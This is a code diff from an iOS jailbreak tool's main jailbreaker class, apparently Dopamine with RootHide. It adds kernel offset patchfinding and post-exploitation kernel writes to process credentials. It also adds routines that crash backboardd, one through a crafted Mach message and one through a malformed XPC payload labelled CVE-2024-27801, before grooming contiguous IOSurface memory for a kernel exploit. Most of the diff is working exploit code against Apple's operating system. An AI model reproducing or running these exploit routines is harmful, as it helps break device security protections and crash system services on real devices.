@@ -33,6 +33,8 @@
 #import <CoreServices/LSApplicationProxy.h>
 #import <sys/utsname.h>
 #import "spawn.h"
+#import "clock_alarm.h"
+#import <IOSurface/IOSurfaceRef.h>
 int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);
 
 #define kCFPreferencesNoContainer CFSTR("kCFPreferencesNoContainer")
@@ -59,60 +61,139 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     JBErrorCodeFailedInitProtection          = -12,
     JBErrorCodeFailedInitFakeLib             = -13,
     JBErrorCodeFailedDuplicateApps           = -14,
+    JBErrorCodeFailedContiguousMappingCrash  = -15,
+    JBErrorCodeFailedContiguousMappingAlloc  = -16,
+    JBErrorCodeFailedContiguousMappingPort   = -17,
+    JBErrorCodeFailedContiguousMappingPreserve = -18,
 };
+
+static const NSUInteger kDOContiguousMappingMaximumAttempts = 512;
+static const uint64_t kDOContiguousMappingMaximumNanoseconds = 180ULL * NSEC_PER_MSEC;
+
+static NSError *DOJailbreakerContiguousMappingError(JBErrorCode code, NSString *description)
+{
+    return [NSError errorWithDomain:JBErrorDomain
+                               code:code
+                           userInfo:@{ NSLocalizedDescriptionKey: description }];
+}
+
+static bool DOJailbreakerAppendXPFSet(const char *sets[], size_t capacity, size_t *setCount, const char *set)
+{
+    if (!sets || !setCount || !set || capacity < 2 || *setCount >= capacity - 1) {
+        return false;
+    }
+
+    sets[(*setCount)++] = set;
+    sets[*setCount] = NULL;
+    return true;
+}
 
 @implementation DOJailbreaker
 
 - (NSError *)gatherSystemInformation
 {
-    NSString *kernelPath = [[DOEnvironmentManager sharedManager] accessibleKernelPath];
+    DOEnvironmentManager *environmentManager = [DOEnvironmentManager sharedManager];
+    NSString *kernelPath = [environmentManager accessibleKernelPath];
     if (!kernelPath) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedToFindKernel userInfo:@{NSLocalizedDescriptionKey:@"Failed to find kernelcache. Ensure your device is properly connected to the internet. If it still does not work, try installing Dopamine via TrollStore instead."}];
     NSLog(@"Kernel at %s", kernelPath.UTF8String);
+
+    NSString *sptmPath = [environmentManager accessibleSPTMPath];
+    if (sptmPath) {
+        NSLog(@"SPTM at %s", sptmPath.UTF8String);
+    }
+    NSString *txmPath = [environmentManager accessibleTXMPath];
+    if (txmPath) {
+        NSLog(@"TXM at %s", txmPath.UTF8String);
+    }
+    if (environmentManager.isSPTM && (!sptmPath || !txmPath)) {
+        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:@"SPTM devices require both validated SPTM and TXM images before patchfinding."}];
+    }
     
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Patchfinding") debug:NO];
     
-    int r = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation);
+    int r = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation,
+                                       sptmPath ? sptmPath.fileSystemRepresentation : NULL,
+                                       txmPath ? txmPath.fileSystemRepresentation : NULL);
     if (r == 0) {
-        char *sets[99] = {
+        const char *sets[16] = { 0 };
+        size_t setCount = 0;
+        const char *requiredSets[] = {
             "translation",
             "trustcache",
             "sandbox",
             "physmap",
             "struct",
             "physrw",
-            "perfkrw",
-            NULL,
-            NULL,
-            NULL,
+            "IOSurface",
             NULL,
         };
 
-        uint32_t idx = 7;
+        for (const char **set = requiredSets; *set; set++) {
+            if (!DOJailbreakerAppendXPFSet(sets, sizeof(sets) / sizeof(*sets), &setCount, *set)) {
+                xpf_stop();
+                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:@"XPF set list overflow while preparing required offsets."}];
+            }
+        }
         if (xpf_set_is_supported("devmode")) {
-            sets[idx++] = "devmode"; 
+            if (!DOJailbreakerAppendXPFSet(sets, sizeof(sets) / sizeof(*sets), &setCount, "devmode")) {
+                xpf_stop();
+                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:@"XPF set list overflow while preparing developer-mode offsets."}];
+            }
         }
         if (xpf_set_is_supported("badRecovery")) {
-            sets[idx++] = "badRecovery"; 
+            if (!DOJailbreakerAppendXPFSet(sets, sizeof(sets) / sizeof(*sets), &setCount, "badRecovery")) {
+                xpf_stop();
+                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:@"XPF set list overflow while preparing recovery offsets."}];
+            }
         }
         if (xpf_set_is_supported("arm64kcall")) {
-            sets[idx++] = "arm64kcall"; 
+            if (!DOJailbreakerAppendXPFSet(sets, sizeof(sets) / sizeof(*sets), &setCount, "arm64kcall")) {
+                xpf_stop();
+                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:@"XPF set list overflow while preparing kcall offsets."}];
+            }
+        }
+        if (xpf_set_is_supported("perfkrw")) {
+            if (!DOJailbreakerAppendXPFSet(sets, sizeof(sets) / sizeof(*sets), &setCount, "perfkrw")) {
+                xpf_stop();
+                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:@"XPF set list overflow while preparing perfkrw offsets."}];
+            }
         }
 
+        // RootHide relies on the validated namecache pair in every supported mode.
+        if (!xpf_set_is_supported("namecache") ||
+            !DOJailbreakerAppendXPFSet(sets, sizeof(sets) / sizeof(*sets), &setCount, "namecache")) {
+            xpf_stop();
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:@"RootHide namecache offsets are unavailable."}];
+        }
 
-/********************** roothide *************************/
-sets[idx++] = "namecache";
-
-if (xpf_set_is_supported("amfi_oids")) {
-    sets[idx++] = "amfi_oids";
-}
-
-sets[idx] = NULL;
-/********************** roothide *************************/
-
+        BOOL requiresAMFIOIDs = NO;
+        if (@available(iOS 16.0, *)) {
+            requiresAMFIOIDs = YES;
+        }
+        if (requiresAMFIOIDs &&
+            (!xpf_set_is_supported("amfi_oids") ||
+             !DOJailbreakerAppendXPFSet(sets, sizeof(sets) / sizeof(*sets), &setCount, "amfi_oids"))) {
+            // hideDeveloperMode swaps these records during launchd first-load.
+            // Continuing without both validated records can underflow a zero symbol.
+            xpf_stop();
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:@"Validated RootHide AMFI developer-mode offsets are unavailable on this device."}];
+        }
 
         _systemInfoXdict = xpf_construct_offset_dictionary((const char **)sets);
         if (_systemInfoXdict) {
             xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticBase", gXPF.kernelBase);
+            if (gXPF.sptm) {
+                xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticSptmBase", gXPF.sptmBase);
+            }
+            if (gXPF.txm) {
+                xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticTxmBase", gXPF.txmBase);
+            }
+            if (requiresAMFIOIDs &&
+                (!xpc_dictionary_get_uint64(_systemInfoXdict, "kernelSymbol.launch_env_logging") ||
+                 !xpc_dictionary_get_uint64(_systemInfoXdict, "kernelSymbol.developer_mode_status"))) {
+                xpf_stop();
+                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:@"Validated RootHide AMFI developer-mode metrics are missing."}];
+            }
             printf("System Info:\n");
             xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
                 if (xpc_get_type(value) == XPC_TYPE_UINT64) {
@@ -122,7 +203,9 @@ sets[idx] = NULL;
             });
         }
         if (!_systemInfoXdict) {
-            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF failed with error: (%s)", xpf_get_error()]}];
+            const char *xpfError = xpf_get_error() ?: "unknown error";
+            xpf_stop();
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF failed with error: (%s)", xpfError]}];
         }
         xpf_stop();
     }
@@ -521,6 +604,24 @@ void *boomerang_server(struct boomerang_info *info)
     return [[DOEnvironmentManager sharedManager] finalizeBootstrap];
 }
 
+- (NSError *)cleanUpPostExploitation
+{
+    if (@available(iOS 17.0, *)) {
+        uint64_t proc = proc_self();
+        uint64_t ucred = proc_ucred(proc);
+
+        kwrite32(ucred + koffsetof(ucred, svuid), 501);
+        kwrite32(ucred + koffsetof(ucred, ruid), 501);
+        kwrite32(ucred + koffsetof(ucred, uid), 501);
+
+        kwrite32(ucred + koffsetof(ucred, rgid), 501);
+        kwrite32(ucred + koffsetof(ucred, svgid), 501);
+        kwrite32(ucred + koffsetof(ucred, groups), 501);
+    }
+
+    return nil;
+}
+
 - (void)runWithError:(NSError **)errOut didRemoveJailbreak:(BOOL*)didRemove showLogs:(BOOL *)showLogs
 {
 
@@ -547,7 +648,12 @@ void *boomerang_server(struct boomerang_info *info)
     *errOut = [self gatherSystemInformation];
     if (*errOut) return;
     *errOut = [self doExploitation];
-    if (*errOut) return;
+    if (*errOut) {
+        // A failed bypass can leave exploit resources live and panic on exit.
+        // Preserve the primary error; cleanup here is strictly best-effort.
+        [self cleanUpExploits];
+        return;
+    }
     
     gSystemInfo.jailbreakSettings.markAppsAsDebugged = appJITEnabled;
     gSystemInfo.jailbreakSettings.jetsamMultiplier = jetsamMultiplierOption ? (jetsamMultiplierOption.doubleValue / 2) : 0;
@@ -561,7 +667,10 @@ void *boomerang_server(struct boomerang_info *info)
     
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Building Phys R/W Primitive") debug:NO];
     *errOut = [self buildPhysRWPrimitive];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpExploits];
+        return;
+    }
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Cleaning Up Exploits") debug:NO];
     *errOut = [self cleanUpExploits];
     if (*errOut) return;
@@ -573,28 +682,44 @@ void *boomerang_server(struct boomerang_info *info)
     *errOut = [self elevatePrivileges];
     if (*errOut) return;
     *errOut = [self showNonDefaultSystemApps];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpPostExploitation];
+        return;
+    }
     *errOut = [self ensureDevModeEnabled];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpPostExploitation];
+        return;
+    }
 
     // Now that we are unsandboxed, populate the jailbreak root path
     *errOut = [[DOEnvironmentManager sharedManager] ensureJailbreakRootExists];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpPostExploitation];
+        return;
+    }
     
     if (removeJailbreakEnabled) {
         [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Removing Jailbreak") debug:NO];
         *errOut = [[DOEnvironmentManager sharedManager] deleteBootstrap];
         *didRemove = YES;
+        [self cleanUpPostExploitation];
         return;
     }
     
     *errOut = [[DOEnvironmentManager sharedManager] prepareBootstrap];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpPostExploitation];
+        return;
+    }
     setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/rootfs/sbin:/rootfs/bin:/rootfs/usr/sbin:/rootfs/usr/bin", 1);
     setenv("TERM", "xterm-256color", 1);
 
     *errOut = [[DOEnvironmentManager sharedManager] updateBootLogo];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpPostExploitation];
+        return;
+    }
 
     [[DOEnvironmentManager sharedManager] syncRootHideInjectionSettingsNeedsUnsandbox:NO];
     
@@ -608,11 +733,17 @@ void *boomerang_server(struct boomerang_info *info)
     
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Loading BaseBin TrustCache") debug:NO];
     *errOut = [self loadBasebinTrustcache];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpPostExploitation];
+        return;
+    }
     
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Initializing Environment") debug:NO];
     *errOut = [self injectLaunchdHook];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpPostExploitation];
+        return;
+    }
     
 /*
     // Now that we can, protect important system files by bind mounting on top of them
@@ -633,12 +764,14 @@ void *boomerang_server(struct boomerang_info *info)
 int ret = basebin_generate(false);
 if (ret != 0) {
     *errOut = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Creating fakelib failed with error: %d", ret]}];
+    [self cleanUpPostExploitation];
     return;
 }
 
 ret = ensure_dyld_trustcache(JBROOT_PATH("/basebin/.fakelib/dyld"));
 if (ret != 0) {
     *errOut = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to upload dyld trustcache: %d", ret]}];
+    [self cleanUpPostExploitation];
     return;
 }
 
@@ -659,7 +792,10 @@ setenv("DYLD_INSERT_LIBRARIES", JBROOT_PATH("/basebin/systemhook.dylib"), 1);
     exec_cmd_trusted(JBROOT_PATH("/usr/bin/killall"), "-9", "iconservicesagent", NULL);
     
     *errOut = [self finalizeBootstrapIfNeeded];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpPostExploitation];
+        return;
+    }
     
     [[DOEnvironmentManager sharedManager] setIDownloadEnabled:idownloadEnabled needsUnsandbox:NO];
     
@@ -678,6 +814,9 @@ setenv("DYLD_INSERT_LIBRARIES", JBROOT_PATH("/basebin/systemhook.dylib"), 1);
     // Note: This causes the app to freeze in some instances due to launchd only having physrw_pte, we might want to only do it when neccessary
     // It's only neccessary when we don't immediately userspace reboot
     
+    *errOut = [self cleanUpPostExploitation];
+    if (*errOut) return;
+
     printf("Done!\n");
 }
 
@@ -685,6 +824,238 @@ setenv("DYLD_INSERT_LIBRARIES", JBROOT_PATH("/basebin/systemhook.dylib"), 1);
 {
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Rebooting Userspace") debug:NO];
     [[DOEnvironmentManager sharedManager] rebootUserspace];
+}
+
+- (IOSurfaceRef)allocatePurpleGfxMemWithSize:(size_t)size
+{
+    NSDictionary *surfaceProperties = @{
+        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
+        @"IOSurfaceAllocSize" : @(size),
+    };
+    return IOSurfaceCreate((__bridge CFDictionaryRef)surfaceProperties);
+}
+
+- (BOOL)surfaceIsContiguous:(IOSurfaceRef)surface
+{
+    if (!surface) {
+        return NO;
+    }
+
+    vm_address_t memAddr = (vm_address_t)IOSurfaceGetBaseAddress(surface);
+    vm_size_t memSize = (vm_size_t)IOSurfaceGetAllocSize(surface);
+    if (!memAddr || !memSize) {
+        return NO;
+    }
+
+    vm_region_submap_short_info_data_64_t info = {0};
+    uint32_t count = VM_REGION_SUBMAP_SHORT_INFO_COUNT_64;
+    natural_t depth = 9999999;
+    kern_return_t kr = vm_region_recurse_64(mach_task_self(),
+                                             &memAddr,
+                                             &memSize,
+                                             &depth,
+                                             (vm_region_recurse_info_t)&info,
+                                             &count);
+    return kr == KERN_SUCCESS && info.share_mode == SM_EMPTY && info.object_id != 0;
+}
+
+- (BOOL)contiguousMappingWorks
+{
+    IOSurfaceRef surface = [self allocatePurpleGfxMemWithSize:0x8000];
+    if (!surface) {
+        return NO;
+    }
+
+    BOOL contiguous = [self surfaceIsContiguous:surface];
+    CFRelease(surface);
+    return contiguous;
+}
+
+- (BOOL)contiguousMappingWorkaroundNeeded
+{
+    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
+    return [kernelExploit hasRequirement:@"contiguousMapping"] && ![self contiguousMappingWorks];
+}
+
+- (int)crashBackboardd
+{
+#pragma pack(push, 4)
+    typedef struct {
+        mach_msg_header_t header;
+        mach_msg_body_t body;
+        mach_msg_ool_descriptor_t archive;
+        NDR_record_t ndr;
+        mach_msg_type_number_t archiveLength;
+    } Request;
+#pragma pack(pop)
+
+    kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);
+
+    NSData *archive = [NSKeyedArchiver archivedDataWithRootObject:@[ @[] ]
+                                            requiringSecureCoding:YES
+                                                            error:nil];
+    if (!archive) {
+        return -1;
+    }
+
+    mach_port_t bootstrap = MACH_PORT_NULL;
+    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bootstrap);
+    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(bootstrap)) {
+        return -1;
+    }
+
+    mach_port_t service = MACH_PORT_NULL;
+    kr = bootstrap_look_up(bootstrap, "com.apple.backboard.hid.services", &service);
+    mach_port_deallocate(mach_task_self(), bootstrap);
+    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(service)) {
+        return -1;
+    }
+
+    Request request = {0};
+    request.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    request.header.msgh_size = sizeof(request);
+    request.header.msgh_remote_port = service;
+    request.header.msgh_id = 6000032; // kPostTouchAnnotationsMessageID
+    request.body.msgh_descriptor_count = 1;
+    request.archive.address = (void *)archive.bytes;
+    request.archive.size = (mach_msg_size_t)archive.length;
+    request.archive.copy = MACH_MSG_VIRTUAL_COPY;
+    request.archive.type = MACH_MSG_OOL_DESCRIPTOR;
+    request.ndr = NDR_record;
+    request.archiveLength = (mach_msg_type_number_t)archive.length;
+
+    mach_msg_return_t sendResult = mach_msg(&request.header,
+                                             MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                             request.header.msgh_size,
+                                             0,
+                                             MACH_PORT_NULL,
+                                             1000,
+                                             MACH_PORT_NULL);
+    mach_port_deallocate(mach_task_self(), service);
+    return sendResult == MACH_MSG_SUCCESS ? 0 : -1;
+}
+
+- (int)crashBackboardd_15
+{
+    // CVE-2024-27801: iOS 15's TouchDeliveryPolicyServer follows a distinct path.
+    xpc_connection_t (*createMachService)(const char *, dispatch_queue_t, uint64_t) =
+        dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
+    if (!createMachService) {
+        return -1;
+    }
+
+    xpc_connection_t client = createMachService("com.apple.backboard.TouchDeliveryPolicyServer", NULL, 0);
+    if (!client) {
+        return -1;
+    }
+    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {});
+    xpc_connection_resume(client);
+
+    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
+    if (!message) {
+        xpc_connection_cancel(client);
+        return -1;
+    }
+
+    uint8_t root[1024] = {0};
+    memcpy(root, "bplist17", strlen("bplist17"));
+    xpc_dictionary_set_data(message, "root", root, sizeof(root));
+    xpc_dictionary_set_uint64(message, "proxynum", 1);
+    xpc_dictionary_set_uint64(message, "inv", 1);
+
+    uint8_t uafXpc[1024];
+    memset(uafXpc, 0x41, sizeof(uafXpc));
+    xpc_object_t ool = xpc_data_create(uafXpc, sizeof(uafXpc));
+    if (!ool) {
+        xpc_connection_cancel(client);
+        return -1;
+    }
+    xpc_dictionary_set_value(message, "ool", ool);
+
+    // An XPC error response is expected when the target exits after handling
+    // the request. A non-null reply establishes that the request was sent.
+    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, message);
+    BOOL requestSent = reply != NULL;
+    xpc_connection_cancel(client);
+    // The app target is ARC-enabled; its XPC overlay releases ool, reply,
+    // message, and client on each return path after the connection is cancelled.
+    return requestSent ? 0 : -1;
+}
+
+- (NSError * _Nullable)applyContiguousMappingWorkaround
+{
+    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
+    if (![kernelExploit hasRequirement:@"contiguousMapping"]) {
+        return DOJailbreakerContiguousMappingError(JBErrorCodeFailedContiguousMappingAlloc,
+                                                     @"The selected kernel exploit does not permit the contiguous mapping workaround.");
+    }
+
+    int crashResult = 0;
+    if (@available(iOS 16.0, *)) {
+        crashResult = [self crashBackboardd];
+    }
+    else {
+        crashResult = [self crashBackboardd_15];
+    }
+    if (crashResult != 0) {
+        return DOJailbreakerContiguousMappingError(JBErrorCodeFailedContiguousMappingCrash,
+                                                     @"Failed to prepare the contiguous mapping workaround.");
+    }
+
+    mach_timebase_info_data_t timebase = {0};
+    if (mach_timebase_info(&timebase) != KERN_SUCCESS || !timebase.numer || !timebase.denom) {
+        return DOJailbreakerContiguousMappingError(JBErrorCodeFailedContiguousMappingAlloc,
+                                                     @"Unable to establish a bounded contiguous mapping deadline.");
+    }
+    uint64_t deadlineTicks = (kDOContiguousMappingMaximumNanoseconds * timebase.denom) / timebase.numer;
+    if (!deadlineTicks) {
+        return DOJailbreakerContiguousMappingError(JBErrorCodeFailedContiguousMappingAlloc,
+                                                     @"Unable to establish a bounded contiguous mapping deadline.");
+    }
+
+    const uint64_t startTime = mach_continuous_time();
+    IOSurfaceRef surface = NULL;
+    for (NSUInteger attempt = 0; attempt < kDOContiguousMappingMaximumAttempts; attempt++) {
+        if (mach_continuous_time() - startTime >= deadlineTicks) {
+            break;
+        }
+
+        surface = [self allocatePurpleGfxMemWithSize:0x8000];
+        if (surface && [self surfaceIsContiguous:surface]) {
+            break;
+        }
+        if (surface) {
+            CFRelease(surface);
+            surface = NULL;
+        }
+        usleep(50);
+    }
+
+    if (!surface) {
+        return DOJailbreakerContiguousMappingError(JBErrorCodeFailedContiguousMappingAlloc,
+                                                     @"Unable to obtain a contiguous PurpleGfxMem mapping within the safe retry window.");
+    }
+
+    mach_port_t surfacePort = IOSurfaceCreateMachPort(surface);
+    if (!MACH_PORT_VALID(surfacePort)) {
+        CFRelease(surface);
+        return DOJailbreakerContiguousMappingError(JBErrorCodeFailedContiguousMappingPort,
+                                                     @"Unable to create a port for the contiguous PurpleGfxMem mapping.");
+    }
+
+    kern_return_t preserveResult = clock_alarm_preserve_port(surfacePort, 20);
+    kern_return_t releaseResult = mach_port_mod_refs(mach_task_self(), surfacePort, MACH_PORT_RIGHT_SEND, -1);
+    CFRelease(surface);
+    if (preserveResult != KERN_SUCCESS) {
+        return DOJailbreakerContiguousMappingError(JBErrorCodeFailedContiguousMappingPreserve,
+                                                     @"Unable to preserve the contiguous PurpleGfxMem mapping.");
+    }
+    if (releaseResult != KERN_SUCCESS) {
+        return DOJailbreakerContiguousMappingError(JBErrorCodeFailedContiguousMappingPort,
+                                                     @"Unable to release the local contiguous mapping port safely.");
+    }
+
+    return nil;
 }
 
 @end
